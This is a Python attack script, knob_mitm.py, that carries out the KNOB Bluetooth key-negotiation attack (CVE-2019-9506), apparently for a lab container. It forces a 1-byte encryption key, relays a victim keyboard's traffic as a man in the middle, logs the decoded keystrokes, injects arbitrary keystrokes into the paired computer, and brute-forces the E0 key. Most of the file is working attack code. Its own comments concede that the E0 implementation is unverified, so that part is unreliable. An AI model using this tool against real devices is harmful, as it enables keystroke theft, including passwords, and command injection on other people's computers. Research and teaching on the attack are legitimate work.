#!/usr/bin/env python3
"""
knob_mitm.py — KNOB Full MITM Attack, Mode A (Relay + 1-Byte Entropy)
========================================================================
CVE-2019-9506 | Reference: "KNOB Attack" (Antonioli et al., USENIX Security 2019)

Mode A mechanism (no firmware patch required):
  The attacker is already the relay MITM node (same scatternet as NiNo).
  It controls both LMP key-size negotiations.  Before each connection:

    1. Set adapter minimum encryption key size = 1 via btmgmt.
    2. On the keyboard-facing connection the attacker proposes Ksize=1 in its
       own LMP_encryption_key_size_req.
    3. On the PC-facing connection the attacker likewise accepts / proposes 1.
    4. Both sides end up with a 1-byte session key Kc ∈ {0x00 … 0xFF}.

  E0 brute force (256 candidates):
    - Capture EN_RAND from HCI Encryption Change event (or hcidump).
    - Capture BD_ADDR_master and CLK from the HCI event log.
    - Try Kc = 0x00…0xFF, derive keystream with E0, decrypt first captured
      HID frame, check for valid HID boot keyboard report structure.

Usage (run as root inside the bt-attack-knob container):
  python3 knob_mitm.py --target AA:BB:CC:DD:EE:FF
  python3 knob_mitm.py --target AA:BB:CC:DD:EE:FF --inject "INJECTED"

  # Offline brute-force only (no live device):
  python3 knob_mitm.py --bruteforce \\
      --bd-addr AA:BB:CC:DD:EE:FF \\
      --en-rand 0102030405060708090a0b0c0d0e0f10 \\
      --clk 0x12345 \\
      --ciphertext a1b2c3d4e5f60708

Output tags:
  [PAIRING]   adapter / LMP negotiation events
  [KNOB]      key-size reduction events
  [RELAY] KEY: <ascii>  decoded keystroke from keyboard
  [INJECT] <payload>    keystroke injected to PC side
  [BRUTE]     brute-force progress / result
  [MITM]      session / relay lifecycle events
"""

import argparse
import os
import socket
import struct
import subprocess
import sys
import threading
import time
from typing import Optional

# ---------------------------------------------------------------------------
# Re-use HID helpers from nino_mitm (copied here for standalone operation)
# ---------------------------------------------------------------------------
HID_KEYMAP: dict[int, tuple[str, str]] = {
    0x04: ('a', 'A'), 0x05: ('b', 'B'), 0x06: ('c', 'C'),
    0x07: ('d', 'D'), 0x08: ('e', 'E'), 0x09: ('f', 'F'),
    0x0A: ('g', 'G'), 0x0B: ('h', 'H'), 0x0C: ('i', 'I'),
    0x0D: ('j', 'J'), 0x0E: ('k', 'K'), 0x0F: ('l', 'L'),
    0x10: ('m', 'M'), 0x11: ('n', 'N'), 0x12: ('o', 'O'),
    0x13: ('p', 'P'), 0x14: ('q', 'Q'), 0x15: ('r', 'R'),
    0x16: ('s', 'S'), 0x17: ('t', 'T'), 0x18: ('u', 'U'),
    0x19: ('v', 'V'), 0x1A: ('w', 'W'), 0x1B: ('x', 'X'),
    0x1C: ('y', 'Y'), 0x1D: ('z', 'Z'),
    0x1E: ('1', '!'), 0x1F: ('2', '@'), 0x20: ('3', '#'),
    0x21: ('4', '$'), 0x22: ('5', '%'), 0x23: ('6', '^'),
    0x24: ('7', '&'), 0x25: ('8', '*'), 0x26: ('9', '('),
    0x27: ('0', ')'),
    0x28: ('[ENTER]', '[ENTER]'), 0x29: ('[ESC]', '[ESC]'),
    0x2A: ('[BS]', '[BS]'),       0x2B: ('[TAB]', '[TAB]'),
    0x2C: (' ', ' '),
    0x2D: ('-', '_'), 0x2E: ('=', '+'),
    0x2F: ('[', '{'), 0x30: (']', '}'), 0x31: ('\\', '|'),
    0x33: (';', ':'), 0x34: ("'", '"'),
    0x35: ('`', '~'), 0x36: (',', '<'), 0x37: ('.', '>'),
    0x38: ('/', '?'),
    0x4F: ('[RIGHT]', '[RIGHT]'), 0x50: ('[LEFT]', '[LEFT]'),
    0x51: ('[DOWN]', '[DOWN]'),   0x52: ('[UP]', '[UP]'),
    0x4A: ('[HOME]', '[HOME]'),   0x4D: ('[END]', '[END]'),
    0x4C: ('[DEL]', '[DEL]'),
}
MOD_SHIFT = 0x02 | 0x20
_ASCII_TO_HID: dict[str, tuple[int, bool]] = {}
for _kc, (_lo, _hi) in HID_KEYMAP.items():
    if _lo and _lo not in _ASCII_TO_HID:
        _ASCII_TO_HID[_lo] = (_kc, False)
    if _hi and _hi != _lo and _hi not in _ASCII_TO_HID:
        _ASCII_TO_HID[_hi] = (_kc, True)


def decode_hid_report(report: bytes) -> str:
    if len(report) < 8:
        return ''
    shifted = bool(report[0] & MOD_SHIFT)
    chars = []
    for kc in report[2:8]:
        if kc == 0:
            continue
        pair = HID_KEYMAP.get(kc)
        chars.append((pair[1] if shifted else pair[0]) if pair else f'[kc=0x{kc:02x}]')
    return ''.join(chars)


# ---------------------------------------------------------------------------
# uhid (identical to nino_mitm)
# ---------------------------------------------------------------------------
UHID_DESTROY = 1
UHID_CREATE2 = 11
UHID_INPUT2  = 12

HID_REPORT_DESCRIPTOR = bytes([
    0x05, 0x01, 0x09, 0x06, 0xA1, 0x01,
    0x05, 0x07, 0x19, 0xE0, 0x29, 0xE7, 0x15, 0x00, 0x25, 0x01,
    0x75, 0x01, 0x95, 0x08, 0x81, 0x02,
    0x95, 0x01, 0x75, 0x08, 0x81, 0x03,
    0x95, 0x05, 0x75, 0x01, 0x05, 0x08, 0x19, 0x01, 0x29, 0x05,
    0x91, 0x02, 0x95, 0x01, 0x75, 0x03, 0x91, 0x03,
    0x95, 0x06, 0x75, 0x08, 0x15, 0x00, 0x25, 0x65,
    0x05, 0x07, 0x19, 0x00, 0x29, 0x65, 0x81, 0x00,
    0xC0,
])


def uhid_create(fd: int) -> None:
    rd = HID_REPORT_DESCRIPTOR
    rd_padded = rd + b'\x00' * (4096 - len(rd))
    pkt = struct.pack('<I128s64s64sHHIIII4096s',
        UHID_CREATE2,
        b'KNOB-MITM-Keyboard'.ljust(128, b'\x00'),
        b'0:0:0:0'.ljust(64, b'\x00'),
        b''.ljust(64, b'\x00'),
        len(rd), 0x0005, 0x046D, 0xC52B, 0x0001, 0x0000,
        rd_padded)
    os.write(fd, pkt)


def uhid_send_report(fd: int, report: bytes) -> None:
    padded = report[:4096].ljust(4096, b'\x00')
    os.write(fd, struct.pack('<IH4096s', UHID_INPUT2, len(report), padded))


def uhid_destroy(fd: int) -> None:
    os.write(fd, struct.pack('<I', UHID_DESTROY) + b'\x00' * 8)


RELEASE_REPORT = bytes(8)


def make_hid_report(keycode: int, shift: bool = False) -> bytes:
    return bytes([0x02 if shift else 0x00, 0x00, keycode, 0x00, 0x00, 0x00, 0x00, 0x00])


def inject_string(uhid_fd: int, text: str, delay: float = 0.02) -> None:
    for ch in text:
        entry = _ASCII_TO_HID.get(ch)
        if not entry:
            continue
        keycode, shift = entry
        uhid_send_report(uhid_fd, make_hid_report(keycode, shift))
        time.sleep(delay)
        uhid_send_report(uhid_fd, RELEASE_REPORT)
        time.sleep(delay)
    print(f'[INJECT] {repr(text)}')


# ---------------------------------------------------------------------------
# E0 Stream Cipher
# Bluetooth Core Spec v5.3, Vol 2, Part B, Section 1
#
# Four LFSRs (Σ1–Σ4) driven by a summation combiner.
# Polynomial x^n + x^k + 1 for each LFSR:
#   Σ1: n=25, k=20    Σ2: n=31, k=24
#   Σ3: n=33, k=28    Σ4: n=39, k=36
#
# Initialization (Vol 2, Part B, Section 1.4.1):
#   Form 128-bit init vector from Kc XOR (EN_RAND || BD_ADDR_padded || CLK_padded),
#   load into the four LFSRs consecutively, then run 200 auto-key clocks so
#   the combiner output is fed back into the first LFSR input.
#
# WARNING: Verify this implementation against the official test vectors in
# Bluetooth Core Spec Appendix B before using in production.  The bit-ordering
# of the init vector load is implementation-defined in several published tools;
# adjust _load_lfsrs() if decrypted output doesn't validate.
# ---------------------------------------------------------------------------
class E0Cipher:
    # (degree n, second tap k): polynomial x^n + x^k + 1
    _LFSR_PARAMS = [(25, 20), (31, 24), (33, 28), (39, 36)]

    def __init__(self, kc: bytes, bd_addr: bytes, en_rand: bytes, clk: int) -> None:
        """
        kc      : 16-byte session key (KNOB: byte 0 is the only non-zero byte)
        bd_addr : 6-byte master BD_ADDR (little-endian)
        en_rand : 16-byte EN_RAND from LMP_in_rand / HCI Encryption Change event
        clk     : 26-bit Bluetooth clock value (from HCI Read_Clock)
        """
        if len(kc) != 16 or len(bd_addr) != 6 or len(en_rand) != 16:
            raise ValueError('kc must be 16 bytes, bd_addr 6 bytes, en_rand 16 bytes')
        self._lfsr: list[int] = []
        self._carry: int = 0
        self._load_lfsrs(kc, bd_addr, en_rand, clk)
        # 200-clock initialization phase with auto-key feedback
        for _ in range(200):
            self._clock_init()

    # ---- LFSR helpers -------------------------------------------------------

    @staticmethod
    def _clock_lfsr_once(state: int, n: int, k: int) -> tuple[int, int]:
        """Clock one LFSR: polynomial x^n + x^k + 1.
        State bits are numbered 1..n from LSB.
        Output = LSB (bit 1).  Feedback = bit_n XOR bit_k.
        Shift right; new MSB = feedback.
        """
        out = state & 1
        bit_n = (state >> (n - 1)) & 1
        bit_k = (state >> (k - 1)) & 1
        feedback = bit_n ^ bit_k
        new_state = (state >> 1) | (feedback << (n - 1))
        return new_state, out

    def _clock_all_lfsrs(self) -> list[int]:
        bits = []
        for i, (n, k) in enumerate(self._LFSR_PARAMS):
            new_s, out = self._clock_lfsr_once(self._lfsr[i], n, k)
            self._lfsr[i] = new_s
            bits.append(out)
        return bits

    # ---- Summation combiner -------------------------------------------------

    def _combine(self, bits: list[int]) -> int:
        """Summation combiner: z = Σ bits + 2*carry; output = z&1; carry = z>>1."""
        z = sum(bits) + 2 * self._carry
        self._carry = z >> 1
        return z & 1

    # ---- Initialization -----------------------------------------------------

    def _load_lfsrs(self, kc: bytes, bd_addr: bytes, en_rand: bytes, clk: int) -> None:
        # Build 128-bit initialization value:
        #   init = Kc XOR EN_RAND XOR (bd_addr || 0x00*10) XOR (clk as 16 LE bytes)
        bd_padded = bd_addr + bytes(10)          # 6 + 10 = 16 bytes
        clk_bytes = (clk & 0x3FFFFFF).to_bytes(16, 'little')
        iv = int.from_bytes(kc, 'little')
        iv ^= int.from_bytes(en_rand, 'little')
        iv ^= int.from_bytes(bd_padded, 'little')
        iv ^= int.from_bytes(clk_bytes, 'little')

        # Distribute 128 bits consecutively across the four LFSRs
        # Σ1 ← bits [0..24], Σ2 ← bits [25..55], Σ3 ← bits [56..88], Σ4 ← bits [89..127]
        self._lfsr = []
        pos = 0
        for n, _ in self._LFSR_PARAMS:
            mask = (1 << n) - 1
            val = (iv >> pos) & mask
            # Guard against all-zero LFSR state (degenerate)
            if val == 0:
                val = 1
            self._lfsr.append(val)
            pos += n

    def _clock_init(self) -> None:
        """One initialization clock: output bit is fed back into Σ1 input."""
        bits = self._clock_all_lfsrs()
        s_t = self._combine(bits)
        # Feed output bit back by XORing into LSB of Σ1
        if s_t:
            self._lfsr[0] ^= 1

    # ---- Keystream generation -----------------------------------------------

    def next_bit(self) -> int:
        bits = self._clock_all_lfsrs()
        return self._combine(bits)

    def generate_bytes(self, n: int) -> bytes:
        """Generate n bytes of keystream (LSB-first bit ordering)."""
        out = bytearray(n)
        for i in range(n):
            byte = 0
            for bit in range(8):
                byte |= self.next_bit() << bit
            out[i] = byte
        return bytes(out)

    def decrypt(self, ciphertext: bytes) -> bytes:
        ks = self.generate_bytes(len(ciphertext))
        return bytes(a ^ b for a, b in zip(ciphertext, ks))


# ---------------------------------------------------------------------------
# E0 Brute Force (256 candidates for 1-byte entropy)
# ---------------------------------------------------------------------------
def is_valid_hid_report(report: bytes) -> bool:
    """Heuristic validity check for an 8-byte HID boot keyboard report.
    - Byte 1 must be 0x00 (reserved)
    - Bytes 2-7: each keycode must be 0x00-0x65 (0–101)
    """
    if len(report) < 8:
        return False
    if report[1] != 0x00:
        return False
    return all(0x00 <= kc <= 0x65 for kc in report[2:8])


def bruteforce_e0(
    ciphertext: bytes,
    bd_addr: bytes,
    en_rand: bytes,
    clk: int,
    strip_hid_header: bool = True,
) -> Optional[tuple[int, bytes]]:
    """
    Try all 256 possible 1-byte Kc values.  Returns (kc_byte, plaintext) on
    success, or None if no candidate produces a valid HID report.

    strip_hid_header: if True, the first byte of ciphertext is the 0xA1
    HID-over-L2CAP header and is excluded from the E0 stream (it is sent
    in the clear in some implementations).
    """
    payload = ciphertext[1:] if strip_hid_header else ciphertext
    if len(payload) < 8:
        return None

    print(f'[BRUTE] Starting E0 brute force — 256 candidates')
    print(f'[BRUTE]   BD_ADDR  : {bd_addr.hex(":")}')
    print(f'[BRUTE]   EN_RAND  : {en_rand.hex()}')
    print(f'[BRUTE]   CLK      : 0x{clk:07x}')
    print(f'[BRUTE]   Ciphertext (8 B): {payload[:8].hex()}')

    for kc_byte in range(256):
        kc = bytes([kc_byte]) + bytes(15)   # 1-byte entropy: only first byte non-zero
        try:
            cipher = E0Cipher(kc, bd_addr, en_rand, clk)
            plaintext = cipher.decrypt(payload[:8])
        except Exception:
            continue

        if is_valid_hid_report(plaintext):
            decoded = decode_hid_report(plaintext)
            print(f'[BRUTE] SUCCESS  Kc = 0x{kc_byte:02x}  plaintext = {plaintext.hex()}  ({repr(decoded)})')
            return kc_byte, plaintext

        if kc_byte % 64 == 0:
            print(f'[BRUTE] ... {kc_byte}/256')

    print('[BRUTE] No valid HID report found — check EN_RAND / CLK / ciphertext')
    return None


# ---------------------------------------------------------------------------
# HCI monitoring — capture EN_RAND and CLK from live HCI event stream
# ---------------------------------------------------------------------------

# HCI event codes
HCI_EVENT_PKT               = 0x04
HCI_EVT_ENCRYPTION_CHANGE   = 0x08
HCI_EVT_READ_CLOCK_COMPLETE = 0x0E   # Command Complete for Read_Clock (OCF 0x0407)
HCI_EVT_VENDOR_SPECIFIC     = 0xFF

# Packet indicator for HCI socket
BTPROTO_HCI  = 1
HCI_DEV_NONE = 0xFFFF
HCI_CHANNEL_RAW   = 0
HCI_CHANNEL_USER  = 1
HCI_CHANNEL_MONITOR = 2

HCIDEVUP   = 0x400448CA
SOL_HCI    = 0
HCI_FILTER = 2

# Filter: all event packets
def _make_hci_filter(type_mask: int = 0xFFFFFFFF,
                     event_mask_lo: int = 0xFFFFFFFF,
                     event_mask_hi: int = 0xFFFFFFFF,
                     opcode: int = 0) -> bytes:
    return struct.pack('<IIIH', type_mask, event_mask_lo, event_mask_hi, opcode)


class HCIMonitor:
    """Opens a raw HCI socket and collects EN_RAND + CLK parameters needed for
    the E0 brute force.  Run in a background thread before starting the relay."""

    def __init__(self, hci_idx: int = 0) -> None:
        self.hci_idx = hci_idx
        self.en_rand: Optional[bytes] = None   # 16 bytes from LMP_in_rand
        self.clk: Optional[int] = None          # 26-bit clock
        self.handle: Optional[int] = None       # ACL connection handle
        self._stop = threading.Event()
        self._sock: Optional[socket.socket] = None

    def start(self) -> threading.Thread:
        t = threading.Thread(target=self._run, daemon=True, name='hci-monitor')
        t.start()
        return t

    def stop(self) -> None:
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    def _run(self) -> None:
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, BTPROTO_HCI)
            sock.bind((self.hci_idx,))
            # Accept all HCI event packets
            filt = _make_hci_filter()
            sock.setsockopt(SOL_HCI, HCI_FILTER, filt)
            sock.settimeout(1.0)
            self._sock = sock
        except OSError as e:
            print(f'[KNOB] HCI monitor: cannot open socket: {e}')
            return

        while not self._stop.is_set():
            try:
                raw = sock.recv(1024)
            except socket.timeout:
                continue
            except OSError:
                break
            self._parse_event(raw)

    def _parse_event(self, raw: bytes) -> None:
        # raw[0] should be HCI packet indicator (not always present depending on socket type)
        # HCI event packet: [evt_code(1), param_len(1), params...]
        if len(raw) < 2:
            return
        evt_code = raw[0]

        if evt_code == HCI_EVT_ENCRYPTION_CHANGE and len(raw) >= 5:
            # Params: status(1), handle(2), encryption_enabled(1)
            status = raw[2]
            handle = struct.unpack_from('<H', raw, 3)[0]
            enc_enabled = raw[5] if len(raw) > 5 else 0
            if status == 0 and enc_enabled:
                self.handle = handle
                print(f'[KNOB] HCI Encryption_Change: handle=0x{handle:04x} — encryption ON')
                # EN_RAND comes from LMP_in_rand; not directly in HCI events.
                # It must be read from hcidump output or captured via InternalBlue.
                # Log a reminder:
                print('[KNOB] NOTE: EN_RAND must be read from hcidump -X or captured via '
                      'InternalBlue.  See README for manual extraction steps.')

        elif evt_code == HCI_EVT_VENDOR_SPECIFIC:
            # Some controllers embed LMP PDUs in VS events; log raw for inspection
            print(f'[KNOB] VS event ({len(raw)} bytes): {raw[:16].hex()} ...')


# ---------------------------------------------------------------------------
# LMP entropy reduction via btmgmt
# ---------------------------------------------------------------------------
def _run_cmd(cmd: list[str], label: str = '') -> bool:
    r = subprocess.run(cmd, capture_output=True, text=True)
    tag = label or ' '.join(cmd[2:] if len(cmd) > 2 else cmd)
    if r.returncode != 0:
        print(f'[KNOB] WARN {tag}: {(r.stderr or r.stdout).strip()[:120]}')
        return False
    print(f'[KNOB] {tag}: ok')
    return True


def reduce_entropy(hci: str = 'hci0') -> None:
    """
    Attempt to set minimum encryption key size = 1 on the adapter.

    On unpatched kernels (< 5.1) or unpatched BlueZ (< 5.51), btmgmt accepts
    this and the adapter will negotiate Ksize=1 with both peers.

    On patched kernels the command will be rejected (minimum enforced at 7).
    In that case you need InternalBlue (Mode B) or a vulnerable kernel VM.
    """
    # Power-cycle + set IO-cap to NoInputNoOutput (same as NiNo)
    for cmd in [
        ['btmgmt', '-i', hci, 'power', 'off'],
        ['btmgmt', '-i', hci, 'io-cap', '3'],
        ['btmgmt', '-i', hci, 'bondable', 'on'],
        ['btmgmt', '-i', hci, 'pairable', 'on'],
        ['btmgmt', '-i', hci, 'power', 'on'],
        ['btmgmt', '-i', hci, 'connectable', 'on'],
    ]:
        _run_cmd(cmd)

    # Attempt minimum key-size reduction (requires unpatched kernel/BlueZ)
    ok = _run_cmd(
        ['btmgmt', '-i', hci, 'set-min-enc-key-size', '1'],
        'set-min-enc-key-size 1',
    )
    if not ok:
        print('[KNOB] set-min-enc-key-size rejected — kernel is patched (CVE-2019-9506 fix).')
        print('[KNOB] Options:')
        print('[KNOB]   1. Use an unpatched kernel VM (Linux < 5.1, BlueZ < 5.51)')
        print('[KNOB]   2. Switch to KNOB Mode B with InternalBlue on a Broadcom adapter')
        print('[KNOB]   3. Use --bruteforce with pre-captured parameters for offline demo')
    else:
        print('[KNOB] Entropy reduction active — both sides will negotiate Ksize=1')


# ---------------------------------------------------------------------------
# L2CAP helpers (same as nino_mitm)
# ---------------------------------------------------------------------------
HID_PSM_CONTROL   = 0x0011
HID_PSM_INTERRUPT = 0x0013
HID_HEADER_DATA_INPUT = 0xA1

_captured_ciphertext: Optional[bytes] = None   # first raw frame from keyboard


def open_l2cap(bt_addr: str, psm: int, timeout: float = 10.0) -> socket.socket:
    sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
    sock.settimeout(timeout)
    sock.connect((bt_addr, psm))
    sock.settimeout(None)
    return sock


def bt_connect(bt_addr: str) -> None:
    print(f'[PAIRING] Connecting to keyboard {bt_addr} ...')
    r = subprocess.run(['bluetoothctl', '--', 'connect', bt_addr],
                       capture_output=True, text=True, timeout=20)
    out = r.stdout + r.stderr
    status = 'ok' if ('Connection successful' in out or r.returncode == 0) else 'see output below'
    print(f'[PAIRING] connect {bt_addr}: {status}')
    if status != 'ok':
        print(f'[PAIRING]   {out.strip()[:200]}')


# ---------------------------------------------------------------------------
# Relay loop (extended from NiNo: saves first raw frame for brute force)
# ---------------------------------------------------------------------------
def relay_loop(
    intr_sock: socket.socket,
    uhid_fd: int,
    stop: threading.Event,
    save_first_frame: bool = True,
) -> None:
    global _captured_ciphertext
    intr_sock.settimeout(1.0)
    first = True
    while not stop.is_set():
        try:
            raw = intr_sock.recv(64)
        except socket.timeout:
            continue
        except OSError as e:
            print(f'[MITM] Relay socket error: {e}')
            break
        if not raw:
            print('[MITM] Keyboard closed connection')
            break

        # Save raw (potentially encrypted) first frame for brute force
        if first and save_first_frame:
            _captured_ciphertext = raw
            print(f'[KNOB] First raw frame captured: {raw.hex()}')
            first = False

        report = raw[1:] if (raw[0] == HID_HEADER_DATA_INPUT) else raw
        if len(report) < 8:
            report = report + b'\x00' * (8 - len(report))

        decoded = decode_hid_report(report)
        if decoded:
            print(f'[RELAY] KEY: {decoded}')

        uhid_send_report(uhid_fd, report[:8])

    print('[MITM] Relay loop stopped')


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> int:
    parser = argparse.ArgumentParser(
        description='KNOB Full MITM Mode A — relay + 1-byte entropy + E0 brute force',
    )
    # Live MITM mode (default when --target is given)
    live = parser.add_argument_group('Live MITM (requires hardware)')
    live.add_argument('--target',   metavar='BD_ADDR',
                      help='Keyboard Bluetooth address (AA:BB:CC:DD:EE:FF)')
    live.add_argument('--hci',      default='hci0')
    live.add_argument('--uhid-dev', default='/dev/uhid')
    live.add_argument('--inject',   metavar='TEXT',
                      help='Inject TEXT after relay is established')

    # Offline brute force mode
    bf = parser.add_argument_group('Offline brute force (--bruteforce)')
    bf.add_argument('--bruteforce', action='store_true',
                    help='Skip live relay; run E0 brute force on provided parameters')
    bf.add_argument('--bd-addr',    metavar='HEXSTR',
                    help='Master BD_ADDR as hex (e.g. aabbccddeeff)')
    bf.add_argument('--en-rand',    metavar='HEXSTR',
                    help='EN_RAND as 32 hex chars (16 bytes)')
    bf.add_argument('--clk',        metavar='INT',
                    help='26-bit Bluetooth clock (decimal or 0x hex)')
    bf.add_argument('--ciphertext', metavar='HEXSTR',
                    help='Captured encrypted L2CAP payload as hex')

    args = parser.parse_args()

    # ---- Offline brute force only ------------------------------------------
    if args.bruteforce:
        if not all([args.bd_addr, args.en_rand, args.clk, args.ciphertext]):
            parser.error('--bruteforce requires --bd-addr, --en-rand, --clk, --ciphertext')
        bd_addr   = bytes.fromhex(args.bd_addr.replace(':', ''))
        en_rand   = bytes.fromhex(args.en_rand)
        clk       = int(args.clk, 0)
        ciphertext = bytes.fromhex(args.ciphertext)
        result = bruteforce_e0(ciphertext, bd_addr, en_rand, clk)
        return 0 if result else 1

    # ---- Live MITM mode ----------------------------------------------------
    if not args.target:
        parser.error('Provide --target <BD_ADDR> for live MITM, or --bruteforce for offline mode')

    # 1. Reduce entropy
    reduce_entropy(args.hci)
    time.sleep(1)

    # 2. Start HCI monitor (captures Encryption_Change events)
    monitor = HCIMonitor(hci_idx=int(args.hci.replace('hci', '') or '0'))
    monitor.start()

    # 3. Open uhid (PC-facing)
    print(f'[MITM] Opening uhid at {args.uhid_dev}')
    try:
        uhid_fd = os.open(args.uhid_dev, os.O_RDWR)
    except OSError as e:
        sys.exit(f'[ERROR] Cannot open {args.uhid_dev}: {e}')
    uhid_create(uhid_fd)
    time.sleep(0.5)
    print('[MITM] Virtual keyboard registered (PC side ready)')

    # 4. Connect to keyboard
    bt_connect(args.target)
    time.sleep(2)

    # 5. Open L2CAP HID channels
    print(f'[MITM] Opening HID Control  (PSM 0x{HID_PSM_CONTROL:04x})')
    try:
        ctrl_sock = open_l2cap(args.target, HID_PSM_CONTROL)
    except OSError as e:
        sys.exit(f'[ERROR] L2CAP Control: {e}')
    print(f'[MITM] Opening HID Interrupt (PSM 0x{HID_PSM_INTERRUPT:04x})')
    try:
        intr_sock = open_l2cap(args.target, HID_PSM_INTERRUPT)
    except OSError as e:
        ctrl_sock.close()
        sys.exit(f'[ERROR] L2CAP Interrupt: {e}')

    print(f'[MITM] Session established with {args.target}')

    # 6. Start relay
    stop_event = threading.Event()
    relay_thread = threading.Thread(
        target=relay_loop,
        args=(intr_sock, uhid_fd, stop_event),
        daemon=True,
        name='relay',
    )
    relay_thread.start()
    print('[MITM] Relay active')

    # 7. Optional injection
    if args.inject:
        time.sleep(1)
        inject_string(uhid_fd, args.inject)

    # 8. Run until Ctrl-C, then attempt brute force if we have enough data
    try:
        while relay_thread.is_alive():
            time.sleep(0.5)
    except KeyboardInterrupt:
        print('\n[MITM] Shutting down relay ...')

    stop_event.set()
    relay_thread.join(timeout=3)
    monitor.stop()

    # 9. Attempt E0 brute force on captured frame if EN_RAND is available
    if _captured_ciphertext and monitor.en_rand:
        bd_addr = bytes.fromhex(args.target.replace(':', ''))
        bruteforce_e0(
            _captured_ciphertext,
            bd_addr,
            monitor.en_rand,
            monitor.clk or 0,
        )
    elif _captured_ciphertext:
        print('[KNOB] Frame captured but EN_RAND not yet available via HCI.')
        print('[KNOB] Run offline brute force after extracting EN_RAND from hcidump:')
        print(f'[KNOB]   python3 knob_mitm.py --bruteforce '
              f'--bd-addr {args.target} '
              f'--en-rand <from_hcidump> '
              f'--clk <from_hcidump> '
              f'--ciphertext {_captured_ciphertext.hex()}')

    # 10. Cleanup
    intr_sock.close()
    ctrl_sock.close()
    uhid_destroy(uhid_fd)
    os.close(uhid_fd)
    print('[MITM] Done')
    return 0


if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit('Error: must run as root (requires AF_BLUETOOTH + /dev/uhid)')
    sys.exit(main())
